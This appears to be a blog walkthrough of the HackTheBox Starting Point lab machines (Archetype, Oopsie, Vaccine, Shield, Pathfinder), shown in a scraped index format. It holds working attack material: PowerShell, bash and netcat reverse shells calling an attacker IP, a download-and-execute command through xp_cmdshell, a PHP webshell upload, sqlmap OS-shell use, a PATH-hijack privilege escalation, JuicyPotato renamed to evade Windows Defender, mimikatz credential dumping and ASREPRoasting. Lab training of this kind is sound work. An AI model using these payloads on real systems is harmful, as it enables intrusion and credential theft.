/usr/share/doc/python3-impacket/examples/**mssqlclient.py** ARCHETYPE/sql\\_svc@10.10.10.27 -windows-auth Password: [*] Encryption required, switching to TLS [*] ENVCHANGE(DATABASE): Old Value: master, New Value: master [*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english [*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 16192 [*] INFO(ARCHETYPE): Line 1: Changed database context to 'master'. [*] INFO(ARCHETYPE): Line 1: Changed language setting to us_english. [*] ACK: Result: 1 - Microsoft SQL Server (140 3232) [!] Press help for extra shell commands SQL\u003e We can use the IS_SRVROLEMEMBER function to reveal whether the current SQL user has sysadmin (highest level) privileges on the SQL Server. Luckily we do have sysadmin privileges and we can now enable xp_cmdshell and gain RCE (remote code execution) on the host. Let’s attempt this, by inputting the commands below: EXEC sp_configure ‘Show Advanced Options’, 1; reconfigure; EXEC sp_configure ‘xp_cmdshell’, 1 reconfigure; xp_cmdshell “whoami” SQL\u003eEXEC sp_configure 'Show Advanced Options', 1; reconfigure; .... SQL\u003e EXEC sp_configure 'xp_cmdshell', 1 [*] INFO(ARCHETYPE): Line 185: Configuration option 'xp_cmdshell' changed from 1 to 1. Run the RECONFIGURE statement to install. SQL\u003e reconfigure; SQL\u003e xp_cmdshell \"whoami\" output -------------------------------------------------------------------------------- archetype\\sql_svc NULL The whoami command output reveals that the SQL Server is also running in the context of the user ARCHETYPE\\sql_svc. However, this account doesn’t seem to have administrative privileges on the host. Let’s attempt to get a proper shell, and proceed to further enumerate the system. We can save the PowerShell reverse shell below as shell.ps1. $client = New-Object System.Net.Sockets.TCPClient(\"10.10.14.16\",443); $stream = $client.GetStream(); [byte[]]$bytes = 0..65535|%{0}; while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0) {;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i); $sendback = (iex $data 2\u003e\u00261 | Out-String ); $sendback2 = $sendback + \"# \"; $sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length); $stream.Flush()}; $client.Close() Next, let’s start up a mini webserver in python in order to host the file. We can use the following Python command: kali@kali: ~/HTB/StartingPoint/Archtype $ sudo python3 –m http.server 80 [sudo] password for kali: Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80) … Here we can use: · netcat (a feature-packed networking utility) to reads and writes data across the network. · ufw (Uncomplicated FireWall) to allow incoming connections from a specific IP. After standing up a netcat listener on port 443, we can use ufw to allow the callbacks on port 80 and 443 to our machine: · nc -lvnp 443 · ufw allow from 10.10.10.27 proto tcp to any port 80,443 kali@kali: ~/HTB/StartingPoint/Archtype $ sudo nc –lvpn 4433 listening on [any] 443 … sudo ufw allow from 10.10.10.27 proto tcp to any port 80,443 We can now issue the command to download and execute the reverse shell through xp_cmdshell . (10.10.14.16 attacking machine) xp_cmdshell \"powershell \"IEX (New-Object Net.WebClient).DownloadString(\\\"http://10.10.14.16/shell.ps1\\\");\" -- We can see from our mini webserver that a file has been downloaded A shell is received as sql_svc, and we can get the user.txt on their desktop. Using Tmux, that’s all in one window: ","date":"14 Dec 2020","objectID":"/startingpoint/:2:3","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":["Reversing","Assembly"],"content":"◦ Privilege Escalation As this is a normal user account as well as a service account, it is worth checking for frequently access files or executed commands. We can use the type(link)command to access the PowerShell history file (ConsoleHost_history.txt) to see the administrator’s credentials type C:\\\\Users\\\\sql\\_svc\\\\AppData\\\\Roaming\\\\Microsoft\\\\Windows\\\\Powershell \\\\PSReadline\\\\ConsoleHost\\_history.txt From the ConsoleHost_history.txt we can see the administrator password: net.exe use T: \\\\\\\\Archetype\\\\backups /user:**administrator** **MEGACORP\\_4dm1n!!** exit Below an image of the tree commands: a This also reveals that the backups drive has been mapped using the local administrator credentials. We can use Impacket’s psexec.py to gain a privileged shell . python3 /usr/share/doc/python3-impacket/examples/psexec.py administrator@10.10.10.27 -- Below we can see that we gained Administrative privileges: We can now search for \"root.txt\". -- ","date":"14 Dec 2020","objectID":"/startingpoint/:2:4","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":["Reversing","Assembly"],"content":"▸ OOPSIE ","date":"14 Dec 2020","objectID":"/startingpoint/:3:0","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":["Reversing","Assembly"],"content":"◦ About This box features debugging session and MySQL enumeration Machine : Oopsie Ip: 10.10.10.28 ","date":"14 Dec 2020","objectID":"/startingpoint/:3:1","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":["Reversing","Assembly"],"content":"◦ Enumeration nmap -sC -sV 10.10.10.28 Running a simple Nmap scan reveals two open ports running, for SSH and Apache respectively. Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-06 03:34 EDT Nmap scan report for 10.10.10.28 Host is up (0.037s latency). Not shown: 998 closed ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 2048 61:e4:3f:d4:1e:e2:b2:f1:0d:3c:ed:36:28:36:67:c7 (RSA) | 256 24:1d:a4:17:d4:e3:2a:9c:90:5c:30:58:8f:60:77:8d (ECDSA) |_ 256 78:03:0e:b4:a1:af:e5:c2:f9:8d:29:05:3e:29:c9:f2 (ED25519) 80/tcp open http Apache httpd 2.4.29 ((Ubuntu)) |_http-server-header: Apache/2.4.29 (Ubuntu) |_http-title: Welcome Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 23.92 seconds Nmap reveals reveals that SSH and Apache are available on their default ports. Let’s check out the website. It seems to be a website for the electric vehicle manufacturer MegaCorp. Scrolling down, we note that a reference is made to logging in. We cannot see anything else of interest, so let’s send the request to a web proxy such as Burp, so we can examine the website in more detail. We point the browser to the Burp proxy at 127.0.0.1:8080 Then we refresh the page, and forward the request. On the Target tab, we notice that Burp has passively spidered the website while processing the request. We can see the url “/cdn-cgi/login”. We could have also simply used our browser; in Firefox we could have inspected the web page, and we could have found the same url under the Network Monitor tab: We could have just used “Edit and Resend” Just modify the URL into “http://10.10.10.28/cdn-cgi/login/” And click “Send” And the link to the login page appear in our list: Now just open it in a “New Tab” We confirm that this is a login page. Let’s try to reuse the password MEGACORP_4dm1n!! from the previously compromised machine, with common usernames such as administrator or admin . This is successful, and we gain access to the web portal, which contains additional functionality. However, it seems the developer has implemented tiers of administration, and the Uploads page is further restricted to the super admin user. Let’s examine the URL: “http://10.10.10.28/cdn-cgi/login/admin.php?content=accounts\u0026id=” We can see that for id=1, we will have user admin If we pick Id=4, the user is now john Let’s examine the page in Burp. We refresh on the Accounts page, which displays the user id for our current user, and intercept the request. We notice what seems to be a custom cookie implementation, comprising of the user value and role. We also notice the id parameter, which for our current admin user is 1. This shows that it might be possible to brute force the **id** values, and display the **user** value for another user, such as the super admin account. We can do this using by trying a series of id values, we will use Burp’s Intruder module. We press Clear to remove the pre-populated payload positions We now select the Id value (1), We click Add. Next, click on the Payloads tab. We can generate a sequential list of 1-100 using a simple shell script for i in \\`seq 1 100\\`; do echo \\$i; done Paste the output into the Payloads box. Next we move to “Options” tab We ensure that Follow Redirections is set to “Always”, and select the option to “Process cookies in redirections”. Let’s click on the Target tab, and then click “Start attack”. We sort responses by Length, and view the results. A few of a responses have a different length, and we proceed to examine them. The super admin account is visible, and corresponding user value is identified(86575). Let’s try to access the Uploads page again Let’s substitute the user value (34322) with the super admins value (86575). Let’s click on “Forward” and see what the response into the browser (let’s disable the prox","date":"14 Dec 2020","objectID":"/startingpoint/:3:2","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":["Reversing","Assembly"],"content":"◦ Foothold =============== Let’s check if the developer forgot to implement user input validation, and so we should test if we can upload other files, such as a PHP webshell .Let’s locate the “php-reverse-shell .php” file. kali@kali: ~/HTB/StartingPoint/Oopsie$ locate php-reverse-shell.php /usr/share/laudandum/php/php-reverse-shell.php /usr/share/laudandum/wordpress/templates/php-reverse-shell.php /usr/share/webshells/php/php-reverse-shell.php kali@kali: ~/HTB/StartingPoint/Oopsie$ Let’s save this file as “check.php” kali@kali: ~/HTB/StartingPoint/Oopsie$ cp /usr/share/webshells/php/php-reverse-shell.php check.php kali@kali: ~/HTB/StartingPoint/Oopsie$ ls check.php Let’s now customize the file “check.php” file with our IP address and the port values Page reports that the upload of the “check.php” file was successful We don’t know where the reverse shell was uploaded to. Let’s enumerate the web server for common directories using a the dirsearch tool. Let’s run the script for “php” files. From the output we can see that tool identified the uploads folder. We can set up our listener Then we can trigger a reverse shell using the curl command. Below a a shell as www-data and proceed to upgrade it. Let’s upgrade the reverse shell as follow: SHELL=/bin/bash script -q /dev/null \u003cCtrl-Z\u003e stty raw -echo fg reset xterm And we get the fully interactive shell: www-data@oopsie:/$ ","date":"14 Dec 2020","objectID":"/startingpoint/:3:3","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":["Reversing","Assembly"],"content":"◦ Lateral Movement ================== The website records are probably retrieved from a database, so it’s a good idea to check for database connection information. Let’s check for any db file: www-data@oopsie:/$ locate db -- And we eventually find the “/var/www/html/cdn-cgi/login/db.php” file. /var/lib/lxcf/…. /var/lib/lxcf/…. /var/lib/lxcf/…. /var/lib/man-db/…. /var/lib/mlocate/…. /var/lib/mlocate/…. /var/www/html/cdn-cgi/login/db.php -- Let check the db.php file From the php.net manual page “https://www.php.net/manual/en/function.mysqli-connect.php”, we see how mysqli_connect function works: mysqli\\_connect(DB\\_HOST, DB\\_USERNAME, DB\\_PASSWORD,DB\\_NAME);\" So let’s use the page credentials in db.php : • DB_USERNAME: robert • DB_PASSWORD:M3g4C0rpUs3r! We can now use the “su (Switch User)” command to switch user and move laterally. www-data@oopsie:/$ su robert Password: robert@oopsie:/$ -- ","date":"14 Dec 2020","objectID":"/startingpoint/:3:4","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":["Reversing","Assembly"],"content":"◦ Privilege Escalation ====================== The id command reveals that robert is a member of the bugracker group. We can enumerate the filesystem to see if this group has any special acces robert@oopsie:/$ find / -type f -group bugtracker 2\u003e/dev/null /usr/bin/bugtracker -- Let’s list what is inside the directory robert@oopsie:/$ ls -al /usr/bin/bugtracker -rw*s*r-xr-- 1 root_bugtracker 8792 Jan 25 10:14 /usr/bin/bugtracker -- We could have use also the following command to concatenate the two commands: robert@oopsie:/$ find / -type f -group bugtracker 2\u003e/dev/null | xargs ls -al ▹ Setuid -- We can see that there is a special permission on the file “s”. robert@oopsie:/$ ls -al /usr/bin/bugtracker -rwsr-xr-- 1 root_bugtracker 8792 Jan 25 10:14 /usr/bin/bugtracker That is the “setuid” bit, which tells the OS to execute that program with the userid of its owner.This is typically used with files owned by root to allow normal users to execute them as root with no external tools (such as sudo). SUID is a special file permission for executable files which enables other users to run the file with effective permissions of the file owner. Instead of the normal x which represents execute permissions, you will see an s (to indicate SUID) special permission for the user. SGID is a special file permission that also applies to executable files and enables other users to inherit the effective GID of file group owner. Likewise, rather than the usual x which represents execute permissions, you will see an s (to indicate SGID) special permission for group user. Let’s run the bugtracker binary and see what it does. It seems to output a report based on the ID value provided. Let’s use strings to see how it does this. robert@oopsie:/$ strings /usr/bin/bugtracks /lib64/ld-linux-x86-64.so.2 Libc.so.6 ….. ….. - - - - - - - - - - - : EV Bug Tracker : - - - - - - - - - - - Provide Bug ID: - - - - - - - - - - - cat /root/reports/ ;*3$” GCC: (UBUNTU 7.4.0-1ubuntu1~18.04.1) 7.4.0 -- -- -- We see that it calls the “cat” binary using this relative path instead of the absolute path. Let have a look to current $PATH By creating a malicious cat and by modifying the path to include the current working directory, we should be able to abuse this misconfiguration, and escalate our privileges to root. Let’s add the “tmp” directory to PATH robert@oopsie:/$ export PATH=/tmp:$PATH robert@oopsie:/$ export PATH /tmp:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/usr/games:/usr/local/games -- Then we move into the tmp folder: robert@oopsie:/$ cd /tmp/ Let’ create a malicious cat, robert@oopsie:/tmp$ echo '/bin/sh' \u003e cat Let’s make it executable. robert@oopsie:/tmp$ chmod +x cat Now, after making our “malicious” cat executable if we search for the cat executable with the “which” command we will see: robert@oopsie:/tmp$ which –a cat /tmp/cat /bin/cat -- PATH is an environmental variable in Linux and other Unix-like operating systems that tells the shell which directories to search for executable files (i.e., ready-to-run programs) in response to commands issued by a user. The first “cat” command to be executed will be “our malicious” “/tmp/cat”, so by running the bugtracker binary we will have access to a root shell.. If we check the current effective user ID with “whoami”, we will see that we are now root. ","date":"14 Dec 2020","objectID":"/startingpoint/:3:5","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":["Reversing","Assembly"],"content":"◦ Post Exploitation =================== Inside root’s folder, we see a .config folder, which contains a FileZilla config file with the credentials ftpuser and mc@F1l3ZilL4 visible in plain text. ","date":"14 Dec 2020","objectID":"/startingpoint/:3:6","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":["Reversing","Assembly"],"content":"▸ VACCINE ","date":"14 Dec 2020","objectID":"/startingpoint/:4:0","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":["Reversing","Assembly"],"content":"◦ About This box features working with MD5 hashes and escaping user context to root by exploiting sudoer misconfiguration Machine : Vaccine Ip: 10.10.10.46 ","date":"14 Dec 2020","objectID":"/startingpoint/:4:1","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":["Reversing","Assembly"],"content":"◦ Enumeration ====================== nmap -sC -sV 10.10.10.46 Running a simple Nmap scan reveals three open ports running, for FTP, SSH and Apache respectively. Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-03 10:28 EDT Nmap scan report for 10.10.10.46 Host is up (0.041s latency). Not shown: 997 closed ports PORT STATE SERVICE VERSION 21/tcp open ftp vsftpd 3.0.3 22/tcp open ssh OpenSSH 8.0p1 Ubuntu 6build1 (Ubuntu Linux; protocol 2.0) | ssh-hostkey: | 3072 c0:ee:58:07:75:34:b0:0b:91:65:b2:59:56:95:27:a4 (RSA) | 256 ac:6e:81:18:89:22:d7:a7:41:7d:81:4f:1b:b8:b2:51 (ECDSA) |_ 256 42:5b:c3:21:df:ef:a2:0b:c9:5e:03:42:1d:69:d0:28 (ED25519) 80/tcp open http Apache httpd 2.4.41 ((Ubuntu)) | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: Apache/2.4.41 (Ubuntu) |_http-title: MegaCorp Login Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 22.64 seconds The credentials ftpuser with mc@F1l3ZilL4 can be used to login to the FTP server. ftp 10.10.10.46 ftp 10.10.10.46 Connected to 10.10.10.46. 220 (vsFTPd 3.0.3) Name (10.10.10.46:kali): ftpuser 331 Please specify the password. Password: 230 Login successful. Let’s see what is in there: Remote system type is UNIX. Using binary mode to transfer files. ftp\u003e dir 200 PORT command successful. Consider using PASV. 150 Here comes the directory listing. -rw-r--r-- 1 0 0 2533 Feb 03 11:27 backup.zip 226 Directory send OK. A file named backup.zip is found in the folder. Let get the *.zip file: ftp\u003e get backup.zip local: backup.zip remote: backup.zip 200 PORT command successful. Consider using PASV. 150 Opening BINARY mode data connection for backup.zip (2533 bytes). 226 Transfer complete. 2533 bytes received in 0.00 secs (1.1824 MB/s) ftp\u003e 741852963 (backup.zip) Extraction of the archive fails as it’s password protected. The password can be cracked using zip2john, JohntheRipper and rockyou.txt. The zip2john tool will be used to process the input ZIP files into an hash format suitable for use with JohntheRipper zip2john backup.zip \u003e hash The rockyou.txt file (with the passwords) is located here : locate rockyou.txt /usr/share/wordlists/rockyou.txt.gz To extract the rockyou.txt.gz file we use the gunzip command: gunzip /usr/share/wordlists/rockyou.txt.gz Now it is possible to use the JohntheRipper tool as sown below: john hash --fork=4 -w=/usr/share/wordlists/rockyou.txt Using default input encoding: UTF-8 Loaded 1 password hash (PKZIP [32/64]) Node numbers 1-4 of 4 (fork) Press 'q' or Ctrl-C to abort, almost any other key for status 741852963 (backup.zip) 1 1g 0:00:00:00 DONE (2020-07-03 11:33) 100.0g/s 25600p/s 25600c/s ....... Use the \"--show\" option to display all of the cracked passwords reliably Session completed As we can see, the password for the backup.zip file is found to be 741852963 Extracting it’s contents using the password reveals a PHP file and a CSS file. unzip backup.zip Archive: backup.zip [backup.zip] index.php password: inflating: index.php inflating: style.css Inspecting the PHP source code, we find a login check. \u003c?php session_start(); if(isset($_POST['username']) \u0026\u0026 isset($_POST['password'])) { if($_POST['username'] === 'admin' \u0026\u0026 md5($_POST['password']) === \"2cb42f8734ea607eefed3b70af13bbd3\") { $_SESSION['login'] = \"true\"; header(\"Location: dashboard.php\"); } } ?\u003e The input password is hashed into a MD5 hash: 2cb42f8734ea607eefed3b70af13bbd3. T This hash can be easily cracked using an online rainbow table such as crackstation. The result is : qwerty789 ","date":"14 Dec 2020","objectID":"/startingpoint/:4:2","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":["Reversing","Assembly"],"content":"◦ Foothold ====================== Browsing to port 80, we can see a login page for MegaCorp. The credentials admin / qwerty789 can be used to login. The page is found to host a Car Catalogue, and contains functionality to search for products. Searching for example fo the term “a”, results in the following request. http://10.10.10.46/dashboard.php?search=a The page takes in a GET request with the parameter search. This URL is supplied to sqlmap, in order to test for SQL injection vulnerabilities. The website uses cookies, which can be specified using –cookie. Right-click the page and select Inspect Element. Click the Storage tab and copy the PHP Session ID. WE see the PHPSESSID value is :\"gub9n3ugpgc5obsre8jkv8tq3m\" We can construct the Sqlmap query as follows: sqlmap -u 'http://10.10.10.46/dashboard.php?search=a’--cookie=\"PHPSESSID=gub9n3ugpgc5obsre8jkv8tq3m\" Sqlmap found the page to be vulnerable to multiple injections, and identified the backend DBMS to be PostgreSQL. Getting code execution in postgres is trivial using the –os-shell command. sqlmap -u 'http://10.10.10.46/dashboard.php?search=a' --cookie=\"PHPSESSID=gub9n3ugpgc5obsre8jkv8tq3m\" --os-shell .... [*] starting @ 15:32:32 /2020-07-03/ .... .... Parameter: search (GET) .... Title: PostgreSQL \u003e 8.1 stacked queries (comment) Payload: search=a';SELECT PG_SLEEP(5)-- Type: time-based blind Title: PostgreSQL \u003e 8.1 AND time-based blind Payload: search=a' AND 8079=(SELECT 8079 FROM PG_SLEEP(5))-- dEyh .... .... [15:32:34] [INFO] going to use 'COPY ... FROM PROGRAM ...' command execution [15:32:34] [INFO] calling Linux OS shell. To quit type 'x' or 'q' and press ENTER os-shell\u003e ","date":"14 Dec 2020","objectID":"/startingpoint/:4:3","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":["Reversing","Assembly"],"content":"◦ Privilege Escalation This can be used to execute a shell reverse shell . bash -c 'bash -i \u003e\u0026 /dev/tcp/\u003cyour_ip\u003e/4444 0\u003e\u00261' Let’s upgrade to a tty shell and continue enumeration. SHELL=/bin/bash script -q /dev/null Let’s have a look to the source code of dashboard.php in /var/www/html. The code reveals the postgres password to be: P@s5w0rd! This password can be used to view the user’s sudo privileges. The user is allowed to edit the configuration /etc/postgresql/11/main/pg_hba.conf using vi. This can be leveraged to gain a root shell and access root.txt. Once opened the file in “Vi” editor with sudo, we can try to spawn a TTY shell from within vi by typing one of the following command (link): • : ! bash • : set shell=/bin/bash:shell • : ! /bin/bash As we can see, now we have a TTY as root. ","date":"14 Dec 2020","objectID":"/startingpoint/:4:4","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":["Reversing","Assembly"],"content":"▸ SHIELD ","date":"14 Dec 2020","objectID":"/startingpoint/:5:0","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":["Reversing","Assembly"],"content":"◦ About This box features only a root flag. Don’t waste your time on finding the user.txt - until this is corrected by the Dev Team. I’ve raised this issue already, so this article will be updated accordingly when status is changed. UPDATE: Apparently this is solved right now and information “No Flag” for user flag is shown correctly both for Shield and Vaccine. Machine : Shield Ip: 10.10.10.29 ","date":"14 Dec 2020","objectID":"/startingpoint/:5:1","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":["Reversing","Assembly"],"content":"◦ Enumeration ====================== sudo nmap -sC -sV 10.10.10.29 Starting Nmap 7.80 ( https://nmap.org ) at 2020-07-09 12:59 EDT Nmap scan report for 10.10.10.29 Host is up (0.044s latency). Not shown: 998 filtered ports PORT STATE SERVICE VERSION 80/tcp open http Microsoft IIS httpd 10.0 | http-methods: |_ Potentially risky methods: TRACE |_http-server-header: Microsoft-IIS/10.0 |_http-title: IIS Windows Server 3306/tcp open mysql MySQL (unauthorized) Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows From the Nmap output, we find that IIS and MySQL are running on their default ports. IIS (Internet Information Services) is a Web Server created by Microsoft. Let’s navigate to port 80 using a browser. We see the default IIS starting page. Let’s use GoBuster to scan for any sub-directories or files that are hosted on the server. We do found the “/wordpress” folder. WordPress is a Content Management System (CMS) that can be used to quickly create websites and blogs. Let’s do another search using “dirsearch” and pointing directly to that folder We do see some interesting folder and files. Since we have already acquired the password P@s5w0rd!, we can try to login to the WordPress site. We navigate to http://10.10.10.29/wordpress/wp-login.php and try to guess the username. Some common usernames are admin or administrator. The combination admin : P@s5w0rd! is successful and we gain administrative access to the site. ","date":"14 Dec 2020","objectID":"/startingpoint/:5:2","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":["Reversing","Assembly"],"content":"◦ Foothold The administrative access can be leveraged through the msfmodule “exploit/ unix/webapp/wp_admin_shell _upload”, to get a meterpreter shell on the system. Let’s follow the following commands in order to get a session: msfconsole msf \u003e use exploit/unix/webapp/wp_admin_shell_upload msf \u003e set PASSWORD P@s5w0rd! msf \u003e set USERNAME admin msf \u003e set TARGETURI /wordpress msf \u003e set RHOSTS 10.10.10.29 msf \u003e run Now that we got a meterpreter shell , we can use netcat (nc.exe) tp get a more stable shell . So let’s locate the binary. Let’s copy nc.exe into our “Tools” directory From within the meterpeter session, let’s move to oyr local Toolsdirectory kali@kali: ~/HTB/StartingPoint/Tools $ pwd /home/kali/HTB/StartingPoint/Tools -- We can use the lcd command ( lcd stands for “Local Change Directory”, which we use to navigate to the local folder where nc.exe is located.) meterpreter \u003e lcd Usage: lcd directory -- So, let’s move to the “/home/kali/HTB/StartingPoint/Tools” folder wherethe “nc.exe” binary is located meterpreter \u003e lcd /home/kali/HTB/StartingPoint/Tools -- We then navigate to a writeable directory on the server (in our case C:/inetpub/wwwroot/wordpress/wp-content/uploads) and upload netcat. The command to use is the “upload” command: upload nc.exe We can see now the nc.exe program in the “upload” folder ","date":"14 Dec 2020","objectID":"/startingpoint/:5:3","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":["Reversing","Assembly"],"content":"◦ Using Netcat On another terminal we can now launch a listener kali@kali: ~/HTB/StartingPoint/Tools $ nc –lvp 1234 listening on [any] 1234 … -- Next, we can execute the meterpeter followinginto the meterpreter session meterpreter \u003e execute -f nc.exe -a \"-e cmd.exe 10.10.14.16 1234\" pwd C:\\inetpub\\wwwroot\\wordpress\\wp-content\\uploads meterpreter execute -f nc.exe -a \"-e cmd.exe 10.10.14.16 1234\" Process 632 created. ``` -- And we get a netcat shell : ","date":"14 Dec 2020","objectID":"/startingpoint/:5:4","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":["Reversing","Assembly"],"content":"◦ Privilege Escalation ====================== Running the “sysinfo” command on the meterpreter session, we notice that this is a Windows Server 2016 OS, which is vulnerable to the Rotten Potato exploit. Let’s download the “JuicyPotato.exe” binary frome here : https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe Let’s save the binary into our “Tools” folder NOTE: Sometimes browser does not allow the download In this situation we can use the following command: sudo wget https://github.com/ohpe/juicy-potato/releases/download/v0.1/JuicyPotato.exe Then with the lcd command we move to the “Tools” folder from the meterpreter shell and we procede with the upload of the “JuicyPotato.exe” into the “uploads” folder. NOTE: We will have to rename the Juicy Potato executable to something else, otherwise it will be picked up by Windows Defender. From the meterpeter session we can use this command: mv JuicyPotato.exe js.exe -- From the reverse shell on a Windows Machine we can use this command: rename JuicyPotato.exe js.exe -- Below the executed command C:\\inetpub\\wwwroot\\wordpress\\wp-content\\uploads\u003e rename JuicePotatao.exe js.exe Rename JuicePotato.exe js.exe -- -- -- From our shell , we can create a batch file that will be executed by the exploit, and return a SYSTEM shell . Let’s add the following contents to shell .bat: Below the executed command echo START C:\\inetpub\\wwwroot\\wordpress\\wp-content\\uploads\\nc.exe -e powershell.exe 10.10.14.2 1111 \u003e shell.bat C:\\inetpub\\wwwroot\\wordpress\\wp-content\\uploads\u003edir dir …. 07/13/2020 11:55 AM 98 shell.bat …. …. Let’s start, from another terminal, another netcat listener: Next, we execute the netcat shell using the JuicyPotato binary(js.exe): kali@kali:$ js.exe -t * -p C:\\inetpub\\wwwroot\\wordpress\\wp-content\\uploads\\shell.bat -l 1337 NOTE: if our payload is not working, we can use another CLSID Option to add : -c {bb6df56b-cace-11dc-9992-0019b93a3a84} Now on the listener terminal we have a shell as “nt authority\\system” And we can have access to the “root.txt” file ","date":"14 Dec 2020","objectID":"/startingpoint/:5:5","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":["Reversing","Assembly"],"content":"◦ Post Exploitation =================== We can now try to dump cache password. using a tool named “Mimikatz” The 64 bit versione is the one we need We use the meterpeter session to upload the “mimikatz.exe” file: As a “nt authority\\system” we execute mimikatz and use the sekurlsa command to extract logon passwords ./mimikatz.exe sekurlsa::logonpasswords And we find the password “Password1234!” for domain user “Sandra”. ","date":"14 Dec 2020","objectID":"/startingpoint/:5:6","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":["Reversing","Assembly"],"content":"▸ PATHFINDER Machine : Pathfinder Ip: 10.10.10.29 ","date":"14 Dec 2020","objectID":"/startingpoint/:6:0","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":["Reversing","Assembly"],"content":"◦ Enumeration This time we are going to use “masscan” (Mass IP port scanner) root@kali:/# masscan -p 1-65535 10.10.10.30 -e tun0 --rate=1000 Port 88 is typically associated with Kerberos Port 389 with LDAP, which indicates that this is a Domain Controller. We note that WinRM is enabled on port 5985. We can attempt to enumerate Active Directory using the credentials we obtained in a previous machine: sandra Password1234! We can achieve this using a python bloodhound injester, but first, we need to install neo4j and BloodHound. kali@kali:$ sudo apt install neo4j kali@kali:$ sudo apt install bloodhound Let’s install now the python bloodhound injester https://github.com/fox-it/BloodHound.py It can also be installed using pip: kali@kali:$ sudo pip install bloodhound Let’s run the command bloodhound-python -d megacorp.local -u sandra -p \"Password1234!\" -gc pathfinder.megacorp.local -c all -ns 10.10.10.30 The BloodHound injester created some json files ready to be imported into BloodHound. Next, we need to configure the neo4j service. We can accomplish this by running the following command kali@kali: ~/HTB/StartingPoint/Pathfinder$ sudo neo4j console You will be then prompted to insert or change(at first login) your password. If connected we will see Next, we start BloodHound bloodhound --no-sandbox Ensure you have a connection to the database; indicated by a ✔️ symbol at the top of the three input fields. The default username is neo4j with the password previously set. Below before importing the .json files: Opening BloodHound, we can drag and drop the .json files, and BloodHound will begin to analyze the data. We can select various queries, of which some very useful ones are Shortest Paths to High value Targets and Find Principles with DCSync Rights. While the latter query returns this: Let’s select the domain “MEGACORP.LOCAL” The query will generate the below graph for domain “MEGACORP.LOCAL” We can see that the svc_bes has GetChangesAll privileges to thedomain. This means that the account has the ability to request replication data from the domain controller, and gain sensitive information such as user hashes. ","date":"14 Dec 2020","objectID":"/startingpoint/:6:1","tags":["reverse engineering","ida pro","hackthebox","assembly"],"title":"Starting Point on HackTheBox (2020)","uri":"/startingpoint/"},{"categories":["Reversing","Assembly"],"content":"◦ Lateral Movement It’s worth checking if Kerberos pre-authentication has been disabled for this account, which means it is vulnerable to ASREPRoasting. We can check this using a tool such as Impacket’s GetNPUsers. GetNPUsers.py megacorp.local/svc\\_bes -request -no-pass -dc-ip 10.10.10.30 Below out TGT ticket 